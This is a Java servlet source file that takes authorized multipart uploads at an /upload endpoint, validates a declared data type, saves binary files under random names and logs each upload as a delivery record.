package com.theah64.xrob.api.servlets;

import com.theah64.xrob.api.database.tables.Deliveries;
import com.theah64.xrob.api.models.Delivery;
import com.theah64.xrob.api.utils.*;

import javax.servlet.ServletException;
import javax.servlet.annotation.MultipartConfig;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.Part;
import java.io.*;
import java.util.Collection;
import java.util.HashMap;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * Created by theapache64 on 11/18/2015.
 */

@WebServlet(urlPatterns = {"/upload"})
@MultipartConfig
public class FileUploadServlet extends BaseServlet {

    private static final String[] requiredParams = {
            KEY_ERROR, // To track if the delivery has any error
            KEY_MESSAGE //To explain about the success or error
    };


    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        setGETMethodNotSupported(resp);
    }

    @Override
    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        resp.setContentType(CONTENT_TYPE_JSON);

        System.out.println("------------------------------");
        System.out.println("New file upload request received");

        //Out
        final PrintWriter out = resp.getWriter();

        final HeaderSecurity headerSecurity = new HeaderSecurity(req.getHeader(HeaderSecurity.KEY_AUTHORIZATION));

        if (headerSecurity.isAuthorized()) {

            //Building request
            final Request request = new Request(req, requiredParams);

            if (request.hasAllParams()) {

                final boolean hasError = request.getBooleanParameter(KEY_ERROR);
                final String message = request.getStringParameter(KEY_MESSAGE);

                //Has all needed params, so add it to deliveries
                final Delivery newDelivery = new Delivery(headerSecurity.getUserId(), hasError, message);

                if (!hasError) {

                    //No errors found
                    if (request.has(KEY_DATA_TYPE)) {

                        final String dataType = request.getStringParameter(KEY_DATA_TYPE);

                        final Delivery.Type deliveryType = new Delivery.Type(getServletContext(), dataType);

                        if (deliveryType.isValid()) {

                            //Setting data type of delivery
                            newDelivery.setDataType(dataType);

                            //Yes,it's a valid data type
                            final Part dataFilePart = req.getPart(KEY_DATA);

                            if (dataFilePart != null) {


                                final String contentType = dataFilePart.getContentType();
                                final String fileName = new FileName(dataFilePart).getRandomFileName(contentType);
                                final long size = dataFilePart.getSize();

                                if (deliveryType.isBinary()) {

                                    //The data is binary, so instead of saving the data to the database, we're saving the file into it's specific folder.
                                    final String dataStoragePath = deliveryType.getStoragePath();
                                    final File dataStorageDir = new File(dataStoragePath);

                                    if (!dataStorageDir.exists() && !dataStorageDir.mkdirs()) {

                                        out.write(JSONUtils.getErrorJSON(
                                                "Failed to create upload directory : " + dataStorageDir.getAbsolutePath()
                                        ));

                                    } else {
                                        //The directory exists,so create the file
                                        final FileOutputStream fos = new FileOutputStream(deliveryType.getStoragePath() + File.separator + fileName);
                                        final InputStream is = dataFilePart.getInputStream();
                                        byte[] buffer = new byte[1024];
                                        int read;

                                        while ((read = is.read(buffer)) != -1) {
                                            fos.write(buffer, 0, read);
                                        }

                                        fos.flush();
                                        fos.close();
                                        is.close();
                                    }


                                    System.out.println(String.format("File saved :)\nName : %s\nContentType:%s\nSize: %d", fileName, contentType, size));
                                }


                            } else {
                                //ERROR: No file found
                                out.write(
                                        JSONUtils.getErrorJSON(
                                                String.format("%s file is missing", KEY_DATA)
                                        )
                                );
                            }

                            //TODO: Check if the file has some valid data
                            //TODO: Save the file if it's binary or the data in database if it's text.


                        } else {
                            //Invalid data type
                            out.write(
                                    JSONUtils.getErrorJSON(
                                            String.format("Invalid data type %s", dataType)
                                    )
                            );
                        }

                        //What ever the data_type, adding delivery;
                        Deliveries.getInstance().add(newDelivery);

                    } else {
                        //DATA or DATA_TYPE is missing or invalid
                        out.write(
                                JSONUtils.getErrorJSON(
                                        String.format("%s is missing or invalid", KEY_DATA_TYPE)
                                )
                        );
                    }

                } else {
                    //Has error
                    out.write(
                            request.getStringParameter(KEY_MESSAGE)
                    );
                }

            } else {

                //Required params missing or invalid
                out.write(
                        JSONUtils.getErrorJSON(
                                request.getErrorReport()
                        )
                );
            }

        } else {
            //Failed to authorize the request
            out.write(
                    JSONUtils.getErrorJSON(
                            headerSecurity.getFailureReason()
                    )
            );
        }


        out.flush();
        out.close();

        System.out.println("------------------------------");

    }


}
